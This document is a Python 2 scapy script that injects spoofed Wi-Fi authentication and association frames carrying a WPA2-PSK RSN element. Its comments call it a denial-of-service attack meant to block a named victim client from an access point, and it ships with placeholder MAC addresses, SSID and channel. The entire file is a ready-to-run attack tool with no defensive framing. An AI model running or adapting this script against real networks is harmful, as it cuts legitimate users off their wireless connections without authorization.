#!/usr/bin/env python2
import logging
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
from scapy.all import *

import struct, time

def authenticationRequest(bssid, victim):
	print "Sending authentication request ..."
	sendp(RadioTap()/
		Dot11(addr1=bssid, addr2=victim, addr3=bssid)/
		Dot11Auth(algo='open', seqnum=1, status=0),
		iface=conf.iface, verbose=False)

def get_rns_ie():
	# Some default settings
	oui 							= '\x00\x0f\xac'
	wpaVersion 						= '\x01\x00'
	rsnCapabilities					= '\x00\x00'
	
	# Complete the vendor specific information.
	multicastCipherSuite 		= oui + '\x04'		# AES-CCMP

	unicastCipherSuiteCount		= '\x01\x00'
	unicastCipherSuiteList 		= oui + '\x04'		# AES-CCMP

	authKeyManagementSuiteCount = '\x01\x00'
	authKeyManagementSuiteList 	= oui + '\x02'	# PSK
		
	# Create the return value.
	rv  = wpaVersion + multicastCipherSuite
	rv += unicastCipherSuiteCount + unicastCipherSuiteList
	rv += authKeyManagementSuiteCount + authKeyManagementSuiteList

	# RSN also includes an extra RSN Capabilities field
	rv += rsnCapabilities
	info_el = Dot11Elt( ID='RSNinfo', info=rv )

	return info_el

def associationRequest(bssid, victim, ssid, channel):
	wparsn_info_el	= get_rns_ie()
	rates 			= '\x02\x04\x0b\x16\x0c\x12\x18\x24'	# Supported Rates
	esrates 		= '\x30\x48\x60\x6c'					# Extended Supported Rates
	dsset 			= struct.pack("<B", channel)
	ext_cap			= '\x04\x00\x00\x00\x00\x00\x00\x40' 	# Common Extended Capabilities field

	print "Sending association request ..."
	sendp(RadioTap()/
		Dot11(addr1=bssid, addr2=victim, addr3=bssid)/
		Dot11AssoReq(cap='short-slot+privacy+ESS+short-preamble' )/
		Dot11Elt(ID='SSID' 	, info=ssid )/
		Dot11Elt(ID='Rates' 	, info=rates )/
		Dot11Elt(ID='ESRates' 	, info=esrates )/
		Dot11Elt(ID='DSset' 	, info=dsset )/
		wparsn_info_el /
		Dot11Elt( ID=127        , info=ext_cap),
		iface=conf.iface , verbose=False )

def main():
	# Configure interface and the target information
	conf.iface = "wlan0"			# Interface to use for injection
	bssid = "00:11:22:33:44:55"		# MAC address of targeted access point
	victim = "00:66:77:88:99:00"	# MAC address of the victim we want to block
	ssid = "windowstest"			# SSID of the targetd network
	channel = 6						# Channel that the network is not (and the conf.interface should be on)

	# Execute the DoS attack
	authenticationRequest(bssid, victim)
	associationRequest(bssid, victim, ssid, channel)
	time.sleep(0.5)
	associationRequest(bssid, victim, ssid, channel)

	print "Done!"


if __name__ == "__main__":
	main()

